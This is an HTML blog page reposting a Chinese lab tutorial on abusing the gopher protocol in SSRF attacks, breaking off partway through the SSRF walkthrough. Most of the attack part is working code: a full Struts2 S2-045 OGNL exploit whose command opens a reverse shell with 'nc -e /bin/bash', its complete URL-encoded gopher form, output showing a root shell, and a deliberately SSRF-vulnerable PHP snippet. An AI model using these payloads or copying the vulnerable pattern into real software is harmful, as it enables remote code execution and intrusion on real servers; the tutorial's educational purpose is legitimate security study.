@@ -1,0 +1,1483 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="google-site-verification" content="QFVAlCf-2gKGgg_VeeyNJs6Z1SZ3zFiHFVraulVVNSw" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/cat.jpg?v=">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/cat.jpg?v=">
+
+
+  <link rel="mask-icon" href="/images/logo.jpg?v=" color="#222">
+
+
+  <link rel="manifest" href="/images/manifest.json">
+
+
+  <meta name="msapplication-config" content="/images/browserconfig.xml" />
+
+
+
+  <meta name="keywords" content="SSRF," />
+
+
+
+
+  
+
+
+  <link rel="alternate" href="/atom.xml" title="Bosch" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="转载于：https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;BFteonP84h2rEE4TLu09mw    0x00 简介 定义：Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Gopher协议在SSRF漏洞中的深入研究">
+<meta property="og:url" content="https://ckcah.github.io/2020/05/24/Gopher%E5%8D%8F%E8%AE%AE%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%9A%84%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6/index.html">
+<meta property="og:site_name" content="Bosch">
+<meta property="og:description" content="转载于：https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;BFteonP84h2rEE4TLu09mw    0x00 简介 定义：Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://ckcah.github.io/images/CVE-2020-9484/2.png">
+<meta property="og:image" content="https://ckcah.github.io/images/CVE-2020-9484/3.png">
+<meta property="og:image" content="https://ckcah.github.io/images/CVE-2020-9484/4.png">
+<meta property="og:image" content="https://ckcah.github.io/images/CVE-2020-9484/5.png">
+<meta property="og:image" content="https://ckcah.github.io/images/CVE-2020-9484/6.png">
+<meta property="article:published_time" content="2020-05-24T11:38:36.000Z">
+<meta property="article:modified_time" content="2020-05-24T00:12:24.000Z">
+<meta property="article:author" content="bosch cheng">
+<meta property="article:tag" content="SSRF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ckcah.github.io/images/CVE-2020-9484/2.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://ckcah.github.io/2020/05/24/Gopher协议在SSRF漏洞中的深入研究/"/>
+
+
+
+
+
+  <title>Gopher协议在SSRF漏洞中的深入研究 | Bosch</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"><script src="/assets/js/DPlayer.min.js"></script></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Bosch</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">cheng</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            Sitemap
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-commonweal">
+          <a href="/404/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
+            
+            Commonweal 404
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://ckcah.github.io/2020/05/24/Gopher%E5%8D%8F%E8%AE%AE%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%9A%84%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="bosch cheng">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/emperor.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Bosch">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Gopher协议在SSRF漏洞中的深入研究</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-05-24T07:38:36-04:00">
+                2020-05-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2020/05/24/Gopher%E5%8D%8F%E8%AE%AE%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%9A%84%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2020/05/24/Gopher%E5%8D%8F%E8%AE%AE%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%9A%84%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2020/05/24/Gopher%E5%8D%8F%E8%AE%AE%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%9A%84%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6/" class="leancloud_visitors" data-flag-title="Gopher协议在SSRF漏洞中的深入研究">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Visitors&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>转载于：<a href="https://mp.weixin.qq.com/s/BFteonP84h2rEE4TLu09mw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/BFteonP84h2rEE4TLu09mw</a></strong>   </p>
+<p><strong>0x00 简介</strong></p>
+<p><strong>定义：Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。</strong></p>
+<p>但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；</p>
+<p><strong>gopher协议支持发出GET、POST请求</strong>：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议</p>
+<p>限制：gopher协议在各个编程语言中的使用限制</p>
+<table>
+<thead>
+<tr>
+<th><strong>协议</strong></th>
+<th>*<em>支持情况 *</em></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>PHP</td>
+<td>–wite-curlwrappers且php版本至少为5.3</td>
+</tr>
+<tr>
+<td>Java</td>
+<td>小于JDK1.7</td>
+</tr>
+<tr>
+<td>Curl</td>
+<td>低版本不支持</td>
+</tr>
+<tr>
+<td>Perl</td>
+<td>支持</td>
+</tr>
+<tr>
+<td>ASP.NET</td>
+<td>小于版本3</td>
+</tr>
+</tbody></table>
+<p>–wite-curlwrappers：运用curl工具打开url流</p>
+<p>curl使用curl –version查看版本以及支持的协议</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">margine:~ margin$ curl --versioncurl 7.51.0 (x86_64-apple-darwin16.0) libcurl&#x2F;7.51.0 SecureTransport zlib&#x2F;1.2.8Protocols: dict file ftp ftps gopher http https imap imaps ldap ldaps pop3 pop3s rtsp smb smbs smtp smtps telnet tftp Features: AsynchDNS IPv6 Largefile GSS-API Kerberos SPNEGO NTLM NTLM_WB SSL libz UnixSockets</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>Gopher协议格式：</strong></p>
+<p>URL:gopher://<host>:<port>/<gopher-path>_后接TCP数据流</p>
+<ul>
+<li>gopher的默认端口是70</li>
+<li>如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码</li>
+</ul>
+<p><strong>Gopher发送请求HTTP GET请求：</strong></p>
+<p>1.使用Gopher协议发送一个请求，环境为：nc起一个监听，curl发送gopher请求</p>
+<p>2.nc启动监听，监听2333端口：</p>
+<p>3.使用curl发送http请求，命令为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">margine:~ margin$ curl gopher:&#x2F;&#x2F;192.168.0.119:2333&#x2F;abcd</span><br></pre></td></tr></table></figure>
+
+<p>4.此时nc收到的消息为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">margine:~ margin$ nc -lp 2333bcd</span><br></pre></td></tr></table></figure>
+
+<p>5.可以发现url中的a没有被nc接受到，如果命令变为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">margine:~ margin$ curl gopher:&#x2F;&#x2F;192.168.0.119:2333&#x2F;_abcd</span><br></pre></td></tr></table></figure>
+
+<p>6.此时nc收到的消息为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">margine:~ margin$ nc -lp 2333abcd</span><br></pre></td></tr></table></figure>
+
+<p>7.所以需要在使用gopher协议时在url后加入一个字符（该字符可随意写）</p>
+<p>8.那么如何发送HTTP的请求呢？例如GET请求。此时我们联想到，直接发送一个原始的HTTP包不就可以吗？在gopher协议中发送HTTP的数据，需要以下三步：</p>
+<blockquote>
+<p>1、构造HTTP数据包 </p>
+<p>2、URL编码、替换回车换行为%0d%0a </p>
+<p>3、发送gopher协议</p>
+</blockquote>
+<p>9.我准备了一个PHP的代码，如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php    echo &quot;Hello &quot;.$_GET[&quot;name&quot;].&quot;\n&quot;?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>10.一个GET型的HTTP包，如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;ssrf&#x2F;base&#x2F;get.php?name&#x3D;Margin HTTP&#x2F;1.1Host: 192.168.0.109</span><br></pre></td></tr></table></figure>
+
+<p>11.URL编码后为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gopher:&#x2F;&#x2F;192.168.0.109:80&#x2F;_GET%20&#x2F;ssrf&#x2F;base&#x2F;get.php%3fname&#x3D;Margin%20HTTP&#x2F;1.1%0d%0AHost:%20192.168.0.109%0d%0A</span><br></pre></td></tr></table></figure>
+
+<p>12.在转换为URL编码时候有这么几个坑</p>
+<blockquote>
+<p>1、问号（？）需要转码为URL编码，也就是%3f</p>
+<p>2、回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a </p>
+<p>3、在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）</p>
+</blockquote>
+<p><strong>Gopher发送请求HTTP POST请求：</strong></p>
+<p>1.发送POST请求前，先看下POST数据包的格式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;ssrf&#x2F;base&#x2F;post.php HTTP&#x2F;1.1host:192.168.0.109</span><br><span class="line">name&#x3D;Margin</span><br></pre></td></tr></table></figure>
+
+<p>2.那我们将上面的POST数据包进行URL编码并改为gopher协议</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gopher:&#x2F;&#x2F;192.168.0.109:80&#x2F;_POST%20&#x2F;ssrf&#x2F;base&#x2F;post.php%20HTTP&#x2F;1.1%0d%0AHost:192.168.0.1090d%0A%0d%0Aname&#x3D;Margin%0d%0A</span><br></pre></td></tr></table></figure>
+
+<p>post.php的代码为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php    echo &quot;Hello &quot;.$_POST[&quot;name&quot;].&quot;\n&quot;?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>3.使用curl发起gopher的POST请求后，结果为：</p>
+<img src="https://ckcah.github.io/images/CVE-2020-9484/2.png">
+
+<p>4.根据上图发现返回的包爆了501的错误，我的思路是这样的：查看Apache的正常日志和错误日志、查找POST请求中所需的字段。下面分别是正常日志和错误日志的截图：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.0.119 - - [07&#x2F;Mar&#x2F;2020:15:19:49 +0800] &quot;POST &#x2F;ssrf&#x2F;base&#x2F;post.php HTTP&#x2F;1.1&quot; 200 7192.168.0.119 - - [07&#x2F;Mar&#x2F;2020:15:19:49 +0800] &quot;name&#x3D;Margin&quot; 501 213</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Sat Mar 07 15:38:50 2020] [error] [client 192.168.0.119] Invalid method in request name&#x3D;Margin</span><br></pre></td></tr></table></figure>
+
+<p>这里有个疑问：<strong>为什么发起了2次请求？为什么会把参数name=Margin当作一个请求？这个地方我调试了很久，发现问题出现在POST请求头中，我之前发POST请求都是直接用脚本，但从来没考虑过哪些参数是POST请求必须的，经过排查，发现有4个参数为必要参数（四个参数的含义不再赘述）</strong>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;ssrf&#x2F;base&#x2F;post.php HTTP&#x2F;1.1host:192.168.0.109Content-Type:application&#x2F;x-www-form-urlencodedContent-Length:11</span><br><span class="line">name&#x3D;Margin</span><br></pre></td></tr></table></figure>
+
+<p>现在我们将它进行URL编码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gopher:&#x2F;&#x2F;192.168.0.109:80&#x2F;_POST%20&#x2F;ssrf&#x2F;base&#x2F;post.php%20HTTP&#x2F;1.1%0d%0AHost:192.168.0.109%0d%0AContent-Type:application&#x2F;x-www-form-urlencoded%0d%0AContent-Length:11%0d%0A%0d%0Aname&#x3D;Margin%0d%0A</span><br></pre></td></tr></table></figure>
+
+<p>再次发送请求的结果为：</p>
+<img src="https://ckcah.github.io/images/CVE-2020-9484/3.png">
+
+<p>发现请求正常，OK，那我们现在就介绍完了gopher协议的GET和POST请求。</p>
+<p><strong><em>0x01 如何使用gopher协议反弹shell？</em></strong></p>
+<blockquote>
+<p>Struts2框架是一个用于开发Java EE网络应用程序的开放源代码网页应用程序架构。它利用并延伸了Java Servlet  API，鼓励开发者采用MVC架构。Struts2以WebWork优秀的设计思想为核心，吸收了Struts框架的部分优点，提供了一个更加整洁的MVC设计模式实现的Web应用程序框架</p>
+<p>摘自百度百科</p>
+</blockquote>
+<p>今天我们用到的漏洞是Struts2-045漏洞，相信很多大佬不陌生，以下为S2-045漏洞反弹shell的利用代码，我们在本地机器上执行：nc -lp 6666</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;S2-045&#x2F; HTTP&#x2F;1.1Host: 192.168.0.119Content-Type:%&#123;(#_&#x3D;&#39;multipart&#x2F;form-data&#39;).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;nc -e &#x2F;bin&#x2F;bash 192.168.0.119 6666&#39;).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd&#125;:&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们将其变为gopher所能使用的请求</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gopher:&#x2F;&#x2F;192.168.0.119:8080&#x2F;_GET%20&#x2F;S2-045&#x2F;%20HTTP&#x2F;1.1%0d%0aHost:192.168.0.119%0d%0aContent-Type:%25%7b%28%23%5f%3d%27%6d%75%6c%74%69%70%61%72%74%2f%66%6f%72%6d%2d%64%61%74%61%27%29%2e%28%23%64%6d%3d%40%6f%67%6e%6c%2e%4f%67%6e%6c%43%6f%6e%74%65%78%74%40%44%45%46%41%55%4c%54%5f%4d%45%4d%42%45%52%5f%41%43%43%45%53%53%29%2e%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%3f%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%3d%23%64%6d%29%3a%28%28%23%63%6f%6e%74%61%69%6e%65%72%3d%23%63%6f%6e%74%65%78%74%5b%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%2e%63%6f%6e%74%61%69%6e%65%72%27%5d%29%2e%28%23%6f%67%6e%6c%55%74%69%6c%3d%23%63%6f%6e%74%61%69%6e%65%72%2e%67%65%74%49%6e%73%74%61%6e%63%65%28%40%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%6f%67%6e%6c%2e%4f%67%6e%6c%55%74%69%6c%40%63%6c%61%73%73%29%29%2e%28%23%6f%67%6e%6c%55%74%69%6c%2e%67%65%74%45%78%63%6c%75%64%65%64%50%61%63%6b%61%67%65%4e%61%6d%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%6f%67%6e%6c%55%74%69%6c%2e%67%65%74%45%78%63%6c%75%64%65%64%43%6c%61%73%73%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%63%6f%6e%74%65%78%74%2e%73%65%74%4d%65%6d%62%65%72%41%63%63%65%73%73%28%23%64%6d%29%29%29%29%2e%28%23%63%6d%64%3d%27%6e%63%20%2d%65%20%2f%62%69%6e%2f%62%61%73%68%20%31%39%32%2e%31%36%38%2e%30%2e%31%31%39%20%36%36%36%36%27%29%2e%28%23%69%73%77%69%6e%3d%28%40%6a%61%76%61%2e%6c%61%6e%67%2e%53%79%73%74%65%6d%40%67%65%74%50%72%6f%70%65%72%74%79%28%27%6f%73%2e%6e%61%6d%65%27%29%2e%74%6f%4c%6f%77%65%72%43%61%73%65%28%29%2e%63%6f%6e%74%61%69%6e%73%28%27%77%69%6e%27%29%29%29%2e%28%23%63%6d%64%73%3d%28%23%69%73%77%69%6e%3f%7b%27%63%6d%64%2e%65%78%65%27%2c%27%2f%63%27%2c%23%63%6d%64%7d%3a%7b%27%2f%62%69%6e%2f%62%61%73%68%27%2c%27%2d%63%27%2c%23%63%6d%64%7d%29%29%2e%28%23%70%3d%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%50%72%6f%63%65%73%73%42%75%69%6c%64%65%72%28%23%63%6d%64%73%29%29%2e%28%23%70%2e%72%65%64%69%72%65%63%74%45%72%72%6f%72%53%74%72%65%61%6d%28%74%72%75%65%29%29%2e%28%23%70%72%6f%63%65%73%73%3d%23%70%2e%73%74%61%72%74%28%29%29%2e%28%23%72%6f%73%3d%28%40%6f%72%67%2e%61%70%61%63%68%65%2e%73%74%72%75%74%73%32%2e%53%65%72%76%6c%65%74%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%40%67%65%74%52%65%73%70%6f%6e%73%65%28%29%2e%67%65%74%4f%75%74%70%75%74%53%74%72%65%61%6d%28%29%29%29%2e%28%40%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%69%6f%2e%49%4f%55%74%69%6c%73%40%63%6f%70%79%28%23%70%72%6f%63%65%73%73%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%23%72%6f%73%29%29%2e%28%23%72%6f%73%2e%66%6c%75%73%68%28%29%29%7d%0d%0a</span><br></pre></td></tr></table></figure>
+
+<p><strong>一定要注意最后加上%0d%0a，以及很多URL编码工具将会回车换行转码为%0a，一定要自己替换为%0a%0d</strong></p>
+<p>发送请求后可以反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">margine:~ margin$ nc -l 6666iduid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><strong><em>0x02 在SSRF中如何使用gopher协议反弹shell?</em></strong></p>
+<p>1.我们先准备了一个带有ssrf漏洞的页面，代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php    $url &#x3D; $_GET[&#39;url&#39;];    $curlobj &#x3D; curl_init($url);    echo curl_exec($curlobj);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里需要注意的是，你的PHP版本必须大于等于5.3，并且在PHP.ini文件中开启了extension=php_curl.dll</p>
+<ol start="2">
+<li>我在机器上开启了一个监听nc -lp 6666</li>
+</ol>
+<p>然后在浏览器中访问：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.0.109&#x2F;ssrf&#x2F;base&#x2F;curl_exec.php?url&#x3D;gopher:&#x2F;&#x2F;192.168.0.119:6666&#x2F;_abc</span><br></pre></td></tr></table></figure>
+
+<p>可以看到nc接收到了消息，没有问题。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Documents and Settings\Administrator\桌面&gt;nc -lp 6666abc</span><br></pre></td></tr></table></figure>
+
+<p>现在我们想，如何使用SSRF漏洞配合gopher协议来获取shell呢？我们的环境如下(为了节省资源，攻击机和有漏洞的主机是一台机器，请见谅。)：</p>
+<img src="https://ckcah.github.io/images/CVE-2020-9484/4.png">
+
+<p>上图就不具体说了，是一个典型的ssrf利用的解释图。</p>
+<p>在使用ssrf去获取struts2的shell时，遇到了两次困难：</p>
+<p>1.PHP的curl_exec函数没有发起gopher的请求（这个问题上面已经说过）</p>
+<p>2.gopher一直请求不到目标页面</p>
+<p>根据我的试错经历，我梳理了下如何一步步的完成gopher请求获取shell。</p>
+<p>首先我们先做一些简单的事情，顺序如下：</p>
+<p><strong>1.使用ssrf漏洞发起gopher请求，访问前面用到的get.php</strong></p>
+<p><strong>2.使用ssrf漏洞发起gopher请求，获取struts2主机的shell</strong></p>
+<p>第一步：</p>
+<p>准备好访问get.php的数据包（照搬的本文开始的包）</p>
